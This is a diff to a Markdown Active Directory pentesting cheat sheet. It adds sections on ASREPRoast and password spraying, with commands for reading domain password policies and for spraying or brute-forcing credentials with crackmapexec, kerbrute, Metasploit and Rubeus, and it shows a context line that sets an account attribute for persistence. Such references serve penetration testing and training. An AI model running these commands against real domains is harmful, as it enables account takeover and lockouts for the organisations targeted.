@@ -228,6 +228,8 @@ if __name__ == '__main__':
 
 ### Okay we have a valid username, how to get the password:
 
+#### ASREPRoast
+
 1. ASREPRoats:  If a user doesn't have the attribute DONT_REQ_PREAUTH you can request a AS_REP message for that user that will contain some data encrypted by a derivation of the password of the user.
 
 Enumerating vulnerables users
@@ -266,7 +268,69 @@ Persistence
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
-2. Password Spraying -Let's try the most common passwords with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!) or could login with empty password: 
+#### Password Spraying
+
+Password Spraying -Let's try the most common passwords with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!) or could login with empty password: 
+
+##### 1. Get Password Policy 
+
+**Notice that you could lockout some accounts if you try several wrong passwords (by default more than 10).**
+
+If you have some user credentials or a shell as a domain user you can get the password policy with:
+
+CME
+```bash
+crackmapexec <IP> -u 'user' -p 'password' --pass-pol
+```
+
+enum4linux
+```bash
+enum4linx -u 'username' -p 'password' -P <IP>
+```
+
+Powerview
+```bash
+(Get-DomainPolicy)."SystemAccess" #From powerview
+```
+
+#### 2. Exploit
+
+Some automatic tools
+
+CME
+```bash
+crackmapexec smb <IP> -u users.txt -p passwords.txt
+```
+
+kerbrute(often fails, last resort)
+```bash
+python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
+python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
+# Can also tell if username is valid
+./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
+```
+
+msf
+```
+msf6> use scanner/smb/smb_login
+```
+
+
+Rubeus:
+```ps
+# with a list of users
+.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
+
+# check passwords for all users in current domain
+.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
+```
+
+Some manual Scripts to try
+
+[DomainPasswordSpray.ps1]() from dafthack
+
+
 
 
 # Enumerating AD WITH creds
